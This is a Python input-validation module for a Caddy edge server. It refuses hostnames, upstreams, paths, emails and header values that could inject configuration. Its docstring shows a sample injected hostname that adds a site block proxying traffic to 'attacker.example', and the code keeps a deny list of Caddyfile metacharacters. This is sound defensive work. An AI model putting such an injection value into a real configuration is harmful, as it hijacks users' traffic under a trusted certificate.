#!/usr/bin/env python
"""Validate every value BEFORE it reaches the edge config. Refuse; never escape.

THE ATTACK THIS EXISTS FOR — and neither source repository guards it.

A Caddyfile is not data. It is a CONFIGURATION LANGUAGE. An operator-supplied hostname interpolated
into one can inject a whole extra site block:

    evil.com {
      reverse_proxy https://attacker.example
    }
    example.com

That does not produce an invalid config. It produces a perfectly VALID one, with an extra site that
proxies traffic to the attacker — TLS terminated by us, served with our certificate, looking exactly
like us. CWE-74. At the one machine every request on the platform touches.

`ammar` interpolates `{$CADDY_DOMAIN}` straight from the environment. That is safe for exactly as
long as nobody ever lets a user, a tenant admin, or a settings page set it — which is a promise
about the future, not a property of the code.

`Security-tools` validates the host (RFC-1123) before it reaches the renderer, and passes it as an
argv element rather than a shell string. That instinct is right, and it is the single most important
line in their edge.

WHY REFUSE, AND NOT ESCAPE.

Escaping is a bet that you know every metacharacter of the target language, in every version, in
every context it can appear. Caddy has heredocs, environment placeholders `{$VAR}`, request
placeholders `{path}`, snippet imports, and a block syntax. You will not win that bet forever, and
the day you lose it the attacker owns the TLS terminator.

An allowlist is a bet that you know what a hostname looks like. That bet you win.
"""
from __future__ import annotations

import ipaddress
import re

# RFC-1123 host label: a-z 0-9 hyphen, not leading/trailing hyphen, 1..63 chars.
_LABEL = r"[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?"
_HOSTNAME = re.compile(rf"^{_LABEL}(?:\.{_LABEL})*$", re.IGNORECASE)

# host:port for an upstream. The host half is a hostname or an IP; the port is 1..65535.
_UPSTREAM = re.compile(rf"^({_LABEL}(?:\.{_LABEL})*|\[[0-9a-f:]+\]|(?:\d{{1,3}}\.){{3}}\d{{1,3}}):(\d{{1,5}})$",
                       re.IGNORECASE)

# A URL path prefix we are willing to route on. Deliberately narrow.
_PATH = re.compile(r"^/[A-Za-z0-9._~\-/*]*$")

# An email for ACME. Not RFC-5322 (nobody implements that correctly); enough to be a mailbox and
# nothing else.
_EMAIL = re.compile(r"^[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}$")


class EdgeValueRejected(ValueError):
    """A value did not match its allowlist. It is REFUSED — never escaped, never sanitised.

    Sanitising means guessing which characters are dangerous. Refusing means knowing which are
    safe. Only one of those is a property you can prove.
    """


def _reject(kind: str, value: str, why: str) -> None:
    # The rejected value is echoed back deliberately: this is an operator-facing boot error, not a
    # response to an untrusted caller, and an operator who cannot see what was rejected cannot fix
    # it. It never reaches a user.
    raise EdgeValueRejected(f"refusing {kind} {value!r}: {why}")


def hostname(value: str, *, kind: str = "hostname") -> str:
    """An RFC-1123 hostname or an IP literal. Anything else is refused."""
    v = (value or "").strip()
    if not v:
        _reject(kind, value, "empty")
    if len(v) > 253:
        _reject(kind, value, "longer than 253 characters")

    # The check that actually matters. Every one of these is a Caddyfile control character, and any
    # of them turns a hostname into a directive.
    for ch in "{}\n\r\t \"'\\#;`$":
        if ch in v:
            _reject(kind, value, f"contains {ch!r} — a Caddyfile metacharacter. "
                                 f"A hostname cannot contain one, so this is not a hostname.")

    try:
        ipaddress.ip_address(v)
        return v                       # a bare IP literal is fine
    except ValueError:
        pass
    if not _HOSTNAME.match(v):
        _reject(kind, value, "not an RFC-1123 hostname or an IP literal")
    return v


def upstream(value: str) -> str:
    """`host:port` — where the edge forwards. An attacker who controls this owns your traffic."""
    v = (value or "").strip()
    m = _UPSTREAM.match(v)
    if not m:
        _reject("upstream", value, "not host:port")
    port = int(m.group(2))
    if not (1 <= port <= 65535):
        _reject("upstream", value, f"port {port} out of range")
    return v


def path_prefix(value: str) -> str:
    """A path we will route on. Narrow on purpose."""
    v = (value or "").strip()
    if not _PATH.match(v):
        _reject("path", value, "must start with / and contain only [A-Za-z0-9._~-/*]")
    return v


def email(value: str) -> str:
    """The ACME contact. It lands in the Caddyfile global block, so it is validated like everything
    else that does."""
    v = (value or "").strip()
    if not _EMAIL.match(v):
        _reject("acme email", value, "not an email address")
    return v


def header_value(value: str) -> str:
    """A header value we will emit. CR/LF here is response-splitting (CWE-113) at the edge."""
    v = value or ""
    for ch in "\r\n":
        if ch in v:
            _reject("header value", value, "contains CR/LF — header injection")
    if "{" in v or "}" in v:
        _reject("header value", value, "contains a Caddyfile placeholder brace")
    return v
